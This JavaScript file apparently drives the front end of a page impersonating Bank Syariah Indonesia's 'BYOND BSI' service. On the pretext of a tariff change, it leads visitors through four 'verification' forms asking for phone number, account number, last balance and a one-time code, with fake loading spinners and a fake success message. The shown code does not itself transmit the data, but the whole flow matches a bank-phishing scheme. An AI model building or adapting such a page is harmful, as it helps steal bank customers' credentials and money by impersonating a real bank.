// script.js
document.addEventListener('DOMContentLoaded', function() {
    // Variabel untuk menyimpan pilihan tarif
    let selectedTariff = null;

    // Initial loading animation
    setTimeout(function() {
        const loadingScreen = document.getElementById('loadingScreen');
        loadingScreen.classList.add('fade-in');
        
        setTimeout(function() {
            loadingScreen.style.opacity = '0';
            setTimeout(function() {
                loadingScreen.style.display = 'none';
                const mainContent = document.getElementById('mainContent');
                mainContent.style.display = 'block';
                setTimeout(() => {
                    mainContent.classList.add('slide-up');
                }, 50);
            }, 500); // Time for fade-out animation
        }, 2000); // 2 second loading time
    }, 300); // Initial delay

    // Numeric input validation
    const setupNumericInputs = function() {
        const numericInputs = [
            document.getElementById('phoneNumber'),
            document.getElementById('accountNumber'),
            document.getElementById('lastBalance')
        ];
        
        numericInputs.forEach(input => {
            if (input) {
                input.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                });
            }
        });
    };

    // Continue button click handler dengan validasi pilihan tarif
    document.getElementById('btnContinue').addEventListener('click', function() {
        const tariffOld = document.getElementById('tariffOld');
        const tariffNew = document.getElementById('tariffNew');
        
        if (!tariffOld.checked && !tariffNew.checked) {
            alert('Silakan pilih salah satu opsi tarif sebelum melanjutkan.');
            return;
        }
        
        selectedTariff = tariffOld.checked ? 'old' : 'new';
        navigateToForm('mainContent', 'accountVerification1');
        setTimeout(setupNumericInputs, 550);
    });

    // Learn more button click handler
    document.getElementById('btnLearnMore').addEventListener('click', function() {
        alert('Untuk informasi lebih lanjut tentang perubahan tarif, silakan kunjungi website resmi BSI atau hubungi Call Center 14040.');
    });

    // Form submission handlers for verification steps
    document.getElementById('accountForm1').addEventListener('submit', function(e) {
        e.preventDefault();
        showLoading();
        setTimeout(() => {
            hideLoading();
            navigateToForm('accountVerification1', 'accountVerification2');
            setTimeout(setupNumericInputs, 550);
        }, 1500);
    });

    document.getElementById('accountForm2').addEventListener('submit', function(e) {
        e.preventDefault();
        showLoading();
        setTimeout(() => {
            hideLoading();
            navigateToForm('accountVerification2', 'accountVerification3');
            setTimeout(setupNumericInputs, 550);
        }, 1500);
    });

    document.getElementById('accountForm3').addEventListener('submit', function(e) {
        e.preventDefault();
        showLoading();
        setTimeout(() => {
            hideLoading();
            navigateToForm('accountVerification3', 'accountVerification4');
            setTimeout(setupNumericInputs, 550);
        }, 1500);
    });

    document.getElementById('accountForm4').addEventListener('submit', function(e) {
        e.preventDefault();
        showLoading();
        setTimeout(() => {
            hideLoading();
            alert('Verifikasi berhasil! Rekening Anda telah terdaftar di BYOND BSI.');
            // In real implementation, redirect to dashboard
            // window.location.href = 'dashboard.html';
        }, 2000);
    });

    // Request virtual code button
    document.getElementById('requestCodeBtn').addEventListener('click', function() {
        showLoading();
        setTimeout(() => {
            hideLoading();
            alert('Kode virtual telah dikirim ulang ke nomor handphone Anda.');
        }, 1500);
    });

    // Helper functions
    function showLoading() {
        const loadingOverlay = document.getElementById('loadingOverlay');
        loadingOverlay.style.display = 'flex';
        setTimeout(() => {
            loadingOverlay.classList.add('fade-in');
        }, 50);
    }

    function hideLoading() {
        const loadingOverlay = document.getElementById('loadingOverlay');
        loadingOverlay.classList.remove('fade-in');
        setTimeout(() => {
            loadingOverlay.style.display = 'none';
        }, 500);
    }

    function navigateToForm(fromId, toId) {
        const fromElement = document.getElementById(fromId);
        fromElement.classList.add('slide-down');
        
        setTimeout(() => {
            fromElement.style.display = 'none';
            fromElement.classList.remove('slide-down');
            const toElement = document.getElementById(toId);
            toElement.style.display = 'block';
            setTimeout(() => {
                toElement.classList.add('slide-up');
            }, 50);
        }, 500);
    }

    // Initial setup of numeric inputs for the first form
    setupNumericInputs();
});
